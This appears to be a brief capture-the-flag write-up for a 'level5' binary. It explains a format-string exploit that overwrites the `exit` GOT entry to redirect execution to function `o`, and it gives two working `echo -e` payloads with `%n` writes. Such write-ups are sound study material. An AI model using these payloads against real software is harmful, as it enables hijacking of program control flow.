# level5

This time, we need to use the format exploit to overwrite of the address of `exit`
in the `plt` and redirect it to function `o`.

## Useful infos

`readelf -r level5`  
address to overwrite: 0x08049838 = \x38\x98\x04\x08  
new value: 0x080484a4 = 134513828 (address of `o`)

exploit: `echo -e "\x38\x98\x04\x08%134513824x%4\$n"`  
exploit: `echo -e "\x38\x98\x04\x08%134513808x%x%x%n"`